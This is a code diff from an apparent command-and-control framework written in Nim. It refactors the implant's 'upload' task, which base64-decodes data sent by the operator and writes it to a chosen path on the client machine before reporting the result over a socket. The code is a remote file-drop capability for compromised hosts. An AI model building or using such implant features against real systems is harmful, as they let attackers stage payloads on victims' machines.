@@ -1,17 +1,16 @@
-when defined(server):
-  import asyncdispatch, json
-  import ../server/[types, communication]
+import net, base64, json
+import ../client/communication
 
-when defined(client):
-  import net, base64
-  import ../client/communication
+proc executeTask*(socket: net.Socket, taskId: int, params: seq[string]) =
+  let taskOutput = TaskOutput(
+    task: "output",
+    taskId: taskId,
+    error: "",
+    data: %*{}
+  )
 
-when defined(server):
-  proc sendTask*(client: C2Client, path: string, contents: string #[base64'd]#): Future[Task] {.async.} =
-    return await client.sendClientTask("upload", %*{ "contents": contents, "path": path })
-
-when defined(client):
-  proc executeTask*(client: Socket, taskId: int, contents: string, path: string) =
-    let fileContents = decode(contents)
-    writeFile(path, fileContents)
-    client.sendOutput(taskId, "upload", "received file " & path & " (length: " & $len(fileContents) & ")")
+  let fileContents = decode(params[0])
+  writeFile(params[1], fileContents)
+  
+  taskOutput.addData(Text, "result", "received file " & params[1] & " (length: " & $len(fileContents) & ")")
+  socket.sendOutput(taskOutput)
